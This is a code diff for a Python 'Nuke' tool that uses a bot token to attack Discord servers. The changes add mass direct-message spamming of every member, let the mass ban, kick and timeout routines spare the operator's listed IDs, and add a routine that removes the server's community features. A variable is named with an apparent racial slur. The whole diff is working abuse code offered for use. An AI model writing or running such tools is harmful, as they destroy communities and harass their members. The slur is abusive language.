@@ -10,7 +10,10 @@ from shi.console import *
 
 def cls():
     os.system('cls')
-
+def loadids():
+    with open('shi/exids.txt', 'r', encoding='utf-8') as f:
+        ids = f.read().splitlines()
+        return ids
 class Nuke:
     def __init__(self, tkn, server, serverid, wbh=':3', embeds=False, ban=False, webhook=False):
         self.tkn = tkn
@@ -391,12 +394,48 @@ class Nuke:
         except Exception as e:
             Logging.fail(f'Failed to time out {userid} for {days} {st}: {e}')
 
-    def dm(self, userid):
-        'wip'
+    def dm(self, userid, msg):
+        payload = {"recipient_id": userid}
+        try:
+            create = requests.post("https://discord.com/api/v9/users/@me/channels", json=payload, headers={'authorization': f'Bot {self.tkn}'})
+            if create.status_code in [200, 201, 204]:
+                js = create.json()
+                chid = js['id']
+                mesg = {'content': msg}
+                r = requests.post(f'https://discord.com/api/v10/channels/{chid}/messages', headers={'authorization': f'Bot {self.tkn}'}, json=mesg)
+                if r.status_code in [200, 201, 204]:
+                    Logging.success(f'Successfully sent message to {userid}')
+                    
+                elif r.status_code == 429:
+                    Logging.info(f'Rate limit response while trying to dm {userid}')
+                else:
+                    Logging.fail(f'Failed to dm user: {r.status_code} - {r.text}')
+        except Exception as e:
+            Logging.fail(f'Failed to dm user: {e}')
+    
+    def DMAll(self, msg):
+        members = []
+        threads = []
+        payload = {'limit': 1000}
+        nig = requests.get(f"https://discord.com/api/v9/guilds/{self.serverid}/members", headers={'authorization': f'Bot {self.tkn}'}, params=payload)
+        m = nig.json()
+        for mem in m:
+            id = mem['user']['id']
+            members.append(id)
+    
+        for member in members:
+            t = threading.Thread(target=self.dm, args=(member, msg,))
+            threads.append(t)
+            t.start()
+            time.sleep(0.01)
         
+        for t in threads:
+            t.join()        
+            
     def KickAll(self):
         members = []
         threads = []
+        ids = loadids()
         payload = {'limit': 1000}
         nig = requests.get(f"https://discord.com/api/v9/guilds/{self.serverid}/members", headers={'authorization': f'Bot {self.tkn}'}, params=payload)
         m = nig.json()
@@ -408,15 +447,17 @@ class Nuke:
             try:
                 r = requests.delete(f'https://discord.com/api/v9/guilds/{self.serverid}/members/{userid}', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
                 if r.status_code in [200, 201, 204]:
-                    Logging.success(f'Banned {userid}')
+                    Logging.success(f'Kicked {userid}')
                 elif r.status_code == 429:
-                    Logging.info(f'Rate limit response while trying to ban {userid}')
+                    Logging.info(f'Rate limit response while trying to kick {userid}')
                 else:
-                    Logging.fail(f'Failed to ban {userid}: {r.status_code} - {r.text}')
+                    Logging.fail(f'Failed to kick {userid}: {r.status_code} - {r.text}')
             except Exception as e:
-                Logging.fail(f'Failed to ban {userid}: {e}')
+                Logging.fail(f'Failed to kick {userid}: {e}')
 
         for member in members:
+            if member in ids:
+                continue
             t = threading.Thread(target=kick, args=(member,))
             threads.append(t)
             t.start()
@@ -427,6 +468,7 @@ class Nuke:
 
     def BanAll(self):
         members = []
+        ids = loadids()
         threads = []
         payload = {'limit': 1000}
         nig = requests.get(f"https://discord.com/api/v9/guilds/{self.serverid}/members", headers={'authorization': f'Bot {self.tkn}'}, params=payload)
@@ -449,6 +491,8 @@ class Nuke:
                 Logging.fail(f'Failed to ban {userid}: {e}')   
                 
         for member in members:
+            if member in ids:
+                continue
             t = threading.Thread(target=ban, args=(member,))
             threads.append(t)
             t.start()
@@ -456,8 +500,10 @@ class Nuke:
         
         for t in threads:
             t.join()        
-            
+        
     def TimeoutAll(self, days):
+        ids = loadids()
+
         members = []
         threads = []
         payload = {'limit': 1000}
@@ -468,6 +514,9 @@ class Nuke:
             members.append(id)
     
         for member in members:
+            if member in ids:
+                continue
+
             t = threading.Thread(target=self.timeout, args=(member, days,))
             threads.append(t)
             t.start()
@@ -476,21 +525,19 @@ class Nuke:
         for t in threads:
             t.join()        
 
-    def DMAll(self):
-        members = []
-        threads = []
-        payload = {'limit': 1000}
-        nig = requests.get(f"https://discord.com/api/v9/guilds/{self.serverid}/members", headers={'authorization': f'Bot {self.tkn}'}, params=payload)
-        m = nig.json()
-        for mem in m:
-            id = mem['user']['id']
-            members.append(id)
-    
-        for member in members:
-            t = threading.Thread(target=self.dm, args=(self.serverid, member,))
-            threads.append(t)
-            t.start()
-            time.sleep(0.01)
-        
-        for t in threads:
-            t.join()        
+
+    def disable_community(self):
+        payload = {
+        "features": []  
+    }
+        try:
+            r = requests.patch(f'https://discord.com/api/v9/guilds/{self.serverid}', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
+            if r.status_code in [200, 201, 204]:
+                Logging.success('Successfully disabled community mode')
+            elif r.status_code == 420:
+                Logging.info('Rate limit response while trying to disable community mode')
+            else:
+                Logging.fail(f'Failed to disable community mode: {r.status_code} - {r.text}')
+                
+        except Exception as e:
+            Logging.fail(f'Failed to disable community mode: {e}')
